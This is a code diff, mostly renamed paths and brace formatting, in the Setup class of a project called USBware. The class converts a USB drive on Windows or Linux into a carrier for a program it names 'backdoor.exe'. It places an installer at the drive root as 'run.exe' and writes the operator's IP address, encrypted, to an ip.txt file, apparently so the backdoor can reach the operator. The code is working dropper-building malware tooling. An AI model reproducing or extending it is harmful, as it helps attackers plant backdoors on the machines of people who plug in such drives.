@@ -24,7 +24,7 @@ public class Setup {
 			USBware.error("No USB drive found");
 		System.out.println("Enter letter of USB drive (in parentheses) to convert:");
 		for(File file:roots)
-			if(!file.getAbsolutePath().equals("C:\\")) {
+			if(!file.getAbsolutePath().equals("C:\\")){
 				String info=FileSystemView.getFileSystemView().getSystemDisplayName(file);
 				System.out.println(info.substring(0, info.lastIndexOf("("))+"\t(letter: "+file.getAbsolutePath().substring(0, 1)+")");
 			}
@@ -39,15 +39,15 @@ public class Setup {
 	 * @throws IOException
 	 */
 	public static void windowsInstallSetup(String drive, boolean jre) throws IOException {
-		if(jre) {
+		if(jre){
 			String jrePath=System.getProperty("java.home");
-			FileUtils.copyDirectory(new File(jrePath+"\\bin"), new File(drive+":\\files\\jre\\bin"));
-			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\files\\jre\\lib"));
+			FileUtils.copyDirectory(new File(jrePath+"\\bin"), new File(drive+":\\resources\\jre\\bin"));
+			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\resources\\jre\\lib"));
 		}
-		FileUtils.copyDirectory(new File("files\\scripts"), new File(drive+":\\files\\scripts"));
-		FileUtils.copyFile(new File("files\\ins.exe"), new File(drive+":\\run.exe"));
-		FileUtils.copyFile(new File("files\\run.exe"), new File(drive+":\\files\\backdoor.exe"));
-		PrintWriter out=new PrintWriter(new File(drive+":\\files\\ip.txt"));
+		FileUtils.copyDirectory(new File("resources\\scripts"), new File(drive+":\\resources\\scripts"));
+		FileUtils.copyFile(new File("resources\\ins.exe"), new File(drive+":\\run.exe"));
+		FileUtils.copyFile(new File("resources\\run.exe"), new File(drive+":\\resources\\backdoor.exe"));
+		PrintWriter out=new PrintWriter(new File(drive+":\\resources\\ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
 		out.close();
@@ -60,13 +60,13 @@ public class Setup {
 	 * @throws IOException
 	 */
 	public static void windowsRunSetup(String drive, boolean jre) throws IOException {
-		if(jre) {
+		if(jre){
 			String jrePath=System.getProperty("java.home");
 			FileUtils.copyDirectory(new File(jrePath+"\\bin"), new File(drive+":\\jre\\bin"));
 			FileUtils.copyDirectory(new File(jrePath+"\\lib"), new File(drive+":\\jre\\lib"));
 		}
-		FileUtils.copyDirectory(new File("files\\scripts"), new File(drive+":\\scripts"));
-		FileUtils.copyFile(new File("files\\run.exe"), new File(drive+":\\run.exe"));
+		FileUtils.copyDirectory(new File("resources\\scripts"), new File(drive+":\\scripts"));
+		FileUtils.copyFile(new File("resources\\run.exe"), new File(drive+":\\run.exe"));
 		PrintWriter out=new PrintWriter(new File(drive+":\\ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
@@ -81,7 +81,7 @@ public class Setup {
 		USBware.sc.nextLine();
 		ArrayList<String> devices=new ArrayList<String>(Arrays.asList(Utils.runBashCommand("ls /dev/disk/by-label/").split("\n")));
 		System.out.println("Enter name of USB drive (in parentheses) to convert:");
-		for(String device:devices) {
+		for(String device:devices){
 			String nameInfo=Utils.runBashCommand("file /dev/disk/by-label/"+device);
 			System.out.println(device+"\t(name: "+nameInfo.substring(nameInfo.lastIndexOf("/")+1)+")");
 		}
@@ -98,14 +98,14 @@ public class Setup {
 	 * @throws IOException
 	 */
 	public static void linuxInstallSetup() throws IOException {
-		if(new File("jre").isDirectory()&&(new File("jre/bin/").isDirectory()&&new File("jre/lib/").isDirectory())) {
-			FileUtils.copyDirectory(new File("jre/bin/"), new File("/media/USBware/files/jre/bin/"));
-			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/files/jre/lib/"));
+		if(new File("jre").isDirectory() && (new File("jre/bin/").isDirectory() && new File("jre/lib/").isDirectory())){
+			FileUtils.copyDirectory(new File("jre/bin/"), new File("/media/USBware/resources/jre/bin/"));
+			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/resources/jre/lib/"));
 		}
-		FileUtils.copyDirectory(new File("files/scripts/"), new File("/media/USBware/files/scripts/"));
-		FileUtils.copyFile(new File("files/ins.exe"), new File("/media/USBware/run.exe"));
-		FileUtils.copyFile(new File("files/run.exe"), new File("/media/USBware/files/backdoor.exe"));
-		PrintWriter out=new PrintWriter(new File("/media/USBware/files/ip.txt"));
+		FileUtils.copyDirectory(new File("resources/scripts/"), new File("/media/USBware/resources/scripts/"));
+		FileUtils.copyFile(new File("resources/ins.exe"), new File("/media/USBware/run.exe"));
+		FileUtils.copyFile(new File("resources/run.exe"), new File("/media/USBware/resources/backdoor.exe"));
+		PrintWriter out=new PrintWriter(new File("/media/USBware/resources/ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
 		out.close();
@@ -117,12 +117,12 @@ public class Setup {
 	 * @throws IOException
 	 */
 	public static void linuxRunSetup() throws IOException {
-		if(new File("jre").isDirectory()&&(new File("jre/bin/").isDirectory()&&new File("jre/lib/").isDirectory())) {
+		if(new File("jre").isDirectory() && (new File("jre/bin/").isDirectory() && new File("jre/lib/").isDirectory())){
 			FileUtils.copyDirectory(new File("jre/bin/"), new File("/media/USBware/jre/bin/"));
 			FileUtils.copyDirectory(new File("jre/lib/"), new File("/media/USBware/jre/lib/"));
 		}
-		FileUtils.copyDirectory(new File("files/scripts/"), new File("/media/USBware/scripts/"));
-		FileUtils.copyFile(new File("files/run.exe"), new File("/media/USBware/run.exe"));
+		FileUtils.copyDirectory(new File("resources/scripts/"), new File("/media/USBware/scripts/"));
+		FileUtils.copyFile(new File("resources/run.exe"), new File("/media/USBware/run.exe"));
 		PrintWriter out=new PrintWriter(new File("/media/USBware/ip.txt"));
 		out.println(Utils.crypt(Utils.getIP(), "USBwareIP"));
 		out.flush();
